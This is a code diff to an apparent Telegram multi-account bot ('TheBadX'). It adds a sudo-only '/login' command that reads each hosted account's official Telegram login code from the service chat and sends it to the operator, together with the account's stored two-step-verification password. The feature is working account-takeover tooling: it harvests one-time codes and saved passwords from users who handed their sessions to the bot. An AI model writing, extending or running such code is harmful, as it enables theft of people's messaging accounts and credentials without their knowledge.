@@ -137,7 +137,51 @@ async def add_client(RiZoeL: Client, message: Message):
         await message.reply(f"**❎ Error:** {str(er)} \n\n __Report in @{TheBadX.supportGroup}__")
     await checking.delete()
     
+@Client.on_message(filters.private & filters.command("login"))
+async def get_otp_for_user(_, message: Message):
+    if await TheBadX.sudo.sudoFilter(message, 1):
+        return
+    
+    try:
+        user_id = int(message.command[1])
+    except:
+        await message.reply("__Invalid! Please provide a valid user ID.__")
+        return
 
+    wait = await message.reply("__Checking database for this user...__")
+
+    client = None
+    for c in TheBadX.clients:
+        if c.me.id == user_id:
+            client = c
+            break
+
+    if not client:
+        await wait.edit(f"❌ No active client found with user ID `{user_id}`.")
+        return
+
+    phone_id = client.me.phone_number
+    await wait.edit(f"Fetching OTP for `{phone_id}`...")
+
+    async for otp_message in client.get_chat_history(777000, 1):
+        if otp_message.text.lower().startswith("login code:"):
+            otp_code = otp_message.text.split(" ")[2].split(".")[0]
+            break
+    else:
+        otp_code = None
+
+    if otp_code:
+        session_data = TheBadX.database.getSession(phone_id)
+        if session_data and session_data.get('password'):
+            otp_text = f"**🔑 OTP for {phone_id} is:**\n\n**🔐 OTP -** `{otp_code}`\n**🔓 Password -** `{session_data['password']}`"
+        else:
+            otp_text = f"**🔑 OTP for {phone_id} is:** `{otp_code}`"
+
+        await message.reply(otp_text)
+    else:
+        await message.reply(f"**🤷 OTP not received on {phone_id}.** Try again later.")
+    
+    await wait.delete()
 
 @Client.on_message(
     filters.regex("➕ Add Client") & filters.private  # & filters.user(TheBadX.sudo.sudoUsers)
